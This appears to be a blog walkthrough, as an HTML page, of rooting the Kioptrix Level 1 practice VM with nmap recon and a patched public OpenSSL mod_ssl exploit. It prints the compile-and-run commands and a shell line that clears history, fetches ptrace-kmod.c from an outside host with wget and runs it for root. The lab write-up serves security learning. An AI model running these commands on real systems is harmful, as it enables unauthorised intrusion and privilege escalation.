@@ -1,0 +1,310 @@
+<!doctype html>
+<html lang="en" class="no-js">
+<head>
+<meta charset="utf-8">
+<title>CMD-N-CTRL:: Kioptrix - Level 1</title>
+<link href="images/favicons.png" type="img/png" rel="icon">
+<link rel="stylesheet" href="css/github.css">
+<link href="css/font-awesome.css" type="text/css" rel="stylesheet">
+<link href="css/font-family.css" type="text/css" rel="stylesheet">
+</head>
+<body>
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <button>
+        <div class="navicon"></div>
+        </button>
+        <ul class="visible-links">
+          <li class="masthead__menu-item masthead__menu-item--lg"><a href="index.html">CMD - N - CTRL</a></li>
+          <li class="masthead__menu-item"><a href="post.html">Posts</a></li>
+          <li class="masthead__menu-item"><a href="Categories.html">Categories</a></li>
+          <li class="masthead__menu-item"><a href="about.html">About</a></li>
+        </ul>
+        <ul class="hidden-links hidden">
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+<div class="page__hero--overlay" style=" background-image: url(images/kioptrix-banner.jpg)" >
+  <div class="wrapper">
+    <h1 class="page__title" itemprop="headline">Kioptrix - Level 1</h1>
+  </div>
+</div>
+<div id="main" role="main">
+  <div class="sidebar sticky">
+    <div itemscope itemtype="javascript:void(0)">
+      <div class="author__avatar"><a href="about.html"><img src="images/profile.jpg" class="author__avatar" alt="profile"></a></div>
+      <div class="author__content">
+        <h3 class="author__name">CMD - N - CTRL</h3>
+        <p class="author__bio">The only truly secure system is the one that is powered off!!</p>
+      </div>
+      <div class="author__urls-wrapper">
+        <button class="btn btn--inverse">Follow</button>
+        <ul class="author__urls social-icons">
+          <li><i class="fa fa-fw fa-map-marker" aria-hidden="true"></i> The Internet</li>
+          <li><a href="mailto:cmdnctrl2018@gmail.com"><i class="fa fa-fw fa-envelope-square" aria-hidden="true"></i> Email</a></li>
+          <li><a href="https://github.com/cmd-n-ctrl"><i class="fa fa-fw fa-github-square" aria-hidden="true"></i> Github</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <article class="page" itemscope itemtype="javascript:void(0)">
+    <meta itemprop="headline" content="level1">
+    <div class="page__inner-wrap">
+      <section class="page__content" itemprop="text">
+	  <h2>Description:</h2>
+        <p>The Kioptrix series are easy challenges that progress in difficulty as the levels progress. The objective is to acquire root access on the virtual machine, and to teach players the basic techniques in discovering security weaknesses in systems. There are also many ways to complete the challenges something to keep in mind if you choose to approach the challenges differently from the way they are presented here</p>
+      </section>
+	  <h2>What you'll Learn</h2>
+        <ul>
+          <li>Information Gathering</li>
+		  <li>Vulnerability Exploitation</li>
+        </ul>
+		<h2>Information Gathering</h2>
+		<p>The first step is to find our IP Address and then identify our target using <strong>Information Gathering</strong> techniques. This includes <a href="http://www.infosecwriters.com/text_resources/pdf/Footprinting.pdf">Footprinting</a> and <a href="https://en.wikipedia.org/wiki/TCP/IP_stack_fingerprinting">Fingerprinting</a> hosts, servers, etc. If you want to learn more then I suggest you read the <a href="http://www.pentest-standard.org/index.php/Main_Page">PTES Technical Guidelines</a>.</p>
+		<div class="language-console highlighter-rouge">
+          <div class="highlight">
+            <pre class="highlight"><code><span class="gp">root@cmd-n-ctrl:~#</span> ifconfig
+<span class="go">eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet <span class="nt">192.168.2.142</span>  netmask 255.255.255.0  broadcast 192.168.2.255
+        inet6 fe80::20c:29ff:fe27:4277  prefixlen 64  scopeid 0x20<link>
+        ether 00:0c:29:27:42:77  txqueuelen 1000  (Ethernet)
+        RX packets 127583  bytes 190056434 (181.2 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 63804  bytes 3493560 (3.3 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+        device interrupt 18  base 0x2000
+</span></code></pre>
+          </div>
+        </div>
+		<p>Next we will use the <code><span class="gp">netdiscover</span></code> command to find out which hosts are on our network:</p>
+		<div class="language-console highlighter-rouge">
+          <div class="highlight">
+            <pre class="highlight"><code><span class="gp">root@cmd-n-ctrl:~# </span> netdiscover
+<span class="go">                                                                                                                                                                                                   
+ 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                             
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.2.1     00:50:56:c0:00:08      1      60  VMware, Inc.                                                                              
+ 192.168.2.2     00:50:56:e1:58:90      1      60  VMware, Inc.                                                                              
+ <span class="nt">192.168.2.141   00:0c:29:f8:f6:d7      1      60  VMware, Inc.</span>                                                                            
+ 192.168.2.254   00:50:56:ec:88:ae      1      60  VMware, Inc. 
+</span></code></pre>
+          </div>
+        </div>
+		<p>Great, we now know the IP address of 192.168.2.141 is the target of our Kioptrix Machine. Next we need to run an nmap scan to search for any open ports or services running on the Kioptrix VM.</p>
+		<p>Below you will see the nmap command being run if you don’t understand what these commands are doing, then I suggest you read up on nmap switches, which can be found <a href="https://nmap.org/book/man-briefoptions.html">here</a>!</p>
+		<div class="language-console highlighter-rouge">
+          <div class="highlight">
+            <pre class="highlight"><code><span class="gp">root@cmd-n-ctrl:~#</span> nmap -sS -A -n 192.168.2.141
+<span class="go">Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-31 15:20 GMT
+Nmap scan report for 192.168.2.141
+Host is up (0.00023s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+| ssh-hostkey: 
+|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
+|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
+|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
+|_sshv1: Server supports SSHv1
+80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-title: Test Page for the Apache Web Server on Red Hat Linux
+111/tcp  open  rpcbind     2 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1           1024/tcp  status
+|_  100024  1           1024/udp  status
+139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-title: 400 Bad Request
+|_ssl-date: 2018-01-31T06:10:35+00:00; -9h10m32s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC4_64_WITH_MD5
+1024/tcp open  status      1 (RPC #100024)
+MAC Address: 00:0C:29:F8:F6:D7 (VMware)
+Device type: general purpose
+Running: Linux 2.4.X
+OS CPE: cpe:/o:linux:linux_kernel:2.4
+OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
+Network Distance: 1 hop
+
+Host script results:
+|_clock-skew: mean: -9h10m32s, deviation: 0s, median: -9h10m32s
+|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.23 ms 192.168.2.141
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 267.58 seconds
+
+</span></code></pre>
+          </div>
+        </div>
+		<p>Looking at the nmap results we can see that ports 22(SSH) and 80(HTTP) are open. After further examination of the namp scan we can see that Apache is running version 1.3.20 - which is seriously outdated! At the same time, we can see that Apache is running OpenSSL 2.8.4.</p>
+		<p>The exploit database is an excellent resource for finding publicly available exploits, after a quick search for OpenSSL Version 2.8, we stumble across OpenSSL - 'OpenF**k'.c Exploit!</p>
+		<p>Let's download the exploit to our Kali Machine, before we compile the exploit we need to update the code. The code needs to be updated as it's pretty old, I'm using the steps outlined in <a href="http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/ "> PaulSec's Blog.</a></p>
+		<p>Using your favorite text editor here are the steps to make it work:</p>
+		<p><strong>1) Add the following headers:</strong></p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;openssl/rc4.h&gt;
+#include &lt;openssl/md5.h&gt;
+</span></code></pre></div></div>
+<p><strong>2) Update the URL of the C File:</strong></p>
+<p>First search for <code class="highlighter-rouge">wget</code> and find the following line:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define COMMAND2 "unset HISTFILE; cd /tmp; wget http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
+</span></code></pre></div></div>
+<p>Then replace the URL with this one:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+</span></code></pre></div></div>
+<p><strong>3) Get the libssl-dev lib</strong></p>
+<p>To install the library, type the following in your terminal</a>:</p>
+<p>The exploit (764.c) doesn’t seem to be compatible with the newer version of libssl, so you need to install v1.0.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@cmd-n-ctrl:~#</span> apt-get install libssl1.0-dev
+</code></pre></div></div>
+<p><strong>4) Update declaration of variables:</strong></p>
+<p>On line 916, change:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">end</span><span class="p">;</span>
+</code></pre></div></div>
+<p>By adding <strong>const</strong>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">end</span><span class="p">;</span>
+</code></pre></div></div>
+<p><strong>5) Go ahead and save the file, compile the code, and we are done!</strong></p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~#</span> gcc <span class="nt">-o</span> OpenFu<span class="k">**</span>k 764.c <span class="nt">-lcrypto</span>
+</code></pre></div></div>
+<p><strong>NOTE:</strong> 764.c is the file that I saved my exploit script to. <strong>-o</strong> just means to output to a new exactuable called OpenF**k.</p>
+<p>Next let’s go ahead and run the exploit and see its usage.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@cmd-n-ctrl:~#</span> ./OpenF<span class="k">**</span>k 
+<span class="go">
+*******************************************************************
+* OpenF**k v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+</span><span class="gp">* #</span>hackarena  irc.brasnet.org                                     <span class="k">*</span>
+<span class="gp">* TNX Xanthic USG #</span>SilverLords <span class="c">#BloodBR #isotk #highsecure #uname *</span>
+<span class="gp">* #</span>ION <span class="c">#delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span>
+<span class="gp">* #</span>pinchadoresweb HiTechHate DigitalWrapperz P<span class="o">()</span>W GAT ButtP!rateZ <span class="k">*</span>
+<span class="go">*******************************************************************
+************************* - snippet - *****************************
+    0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
+    <span class="nt">0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2</span>
+    0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6)
+*******************************************************************
+: Usage: ./OpenF**k target box [port] [-c N]
+
+  target - supported box eg: 0x00
+  box - hostname or IP address
+  port - port for ssl connection
+  -c open N connections. (use range 40-50 if u dont know)
+</span></code></pre></div></div>
+<p>Since Apache is running on Version 1.3.20, I will select <strong>0x6b</strong> as our <strong>target</strong>. You can see a list of the target usage from the exploit’s output, but I edited the output to save some space.</p>
+<p>Now that we know the target version, IP Address, and HTTP Port - we can run the exploit!</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@cmd-n-ctrl:~#</span> ./OpenF<span class="k">**</span>k 0x6b 192.168.2.141 443 <span class="nt">-c</span> 40
+<span class="go">
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Connection... 40 of 40
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8068
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+</span><span class="gp">bash-2.05$</span> 
+<span class="gp">bash-2.05$</span> <span class="nb">unset </span>HISTFILE<span class="p">;</span> <span class="nb">cd</span> /tmp<span class="p">;</span> wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c<span class="p">;</span> gcc <span class="nt">-o</span> p ptrace-kmod.c<span class="p">;</span> rm ptrace-kmod.c<span class="p">;</span> ./p<span class="p">;</span> 
+<span class="go">--02:09:33--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+</span><span class="gp">           =&gt;</span> <span class="sb">`</span>ptrace-kmod.c<span class="s1">'
+</span><span class="go">Connecting to dl.packetstormsecurity.net:80... connected!
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
+--02:09:33--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+</span><span class="gp">           =&gt;</span> <span class="sb">`</span>ptrace-kmod.c<span class="s1">'
+</span><span class="go">Connecting to dl.packetstormsecurity.net:443... connected!
+HTTP request sent, awaiting response... 200 OK
+Length: 3,921 [text/x-csrc]
+
+    0K ...                                                   100% @   3.74 MB/s
+
+02:09:34 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]
+
+[+] Attached to 1546
+[+] Signal caught
+[+] Shellcode placed at 0x4001189d
+[+] Now wait for suid shell...
+whoami
+root
+</span></code></pre></div></div>
+<h2 id="closing">Clonclusion:</h2>
+<p>Kioptrix Level 1 has been pwnd with a well-known vulnerability and we got root!</p>
+<p>The main objective was to learn some of the basics in tool usage and exploitation. There are 4 more levels in this series, and it just gets harder from here. I hope your ready for the challenge!</p>
+<p>Thanks for reading!</p>
+      <footer class="page__meta"></footer>
+    </div>
+  </article>
+<!--/*sathe*/-->
+<div id="disqus_thread"></div>
+<script>
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://https-cmd-n-ctrl-github-io-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<!--/*sathe*/-->
+<script id="dsq-count-scr" src="//https-cmd-n-ctrl-github-io-1.disqus.com/count.js" async></script>
+    </div>
+  </article>
+</div>
+<div class="page__footer">
+  <footer>
+    <div class="page__footer-follow">
+      <ul class="social-icons">
+        <li><strong>Follow:</strong></li>
+        <li><a href="javascript:void(0)"><i class="fa fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        <li><a href="javascript:void(0)"><i class="fa fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+      </ul>
+    </div>
+    <div class="page__footer-copyright">© 2018 CMD - N - CTRL.</div>
+  </footer>
+</div>
+<script src="js/github.js"></script>
+</body>
+</html>
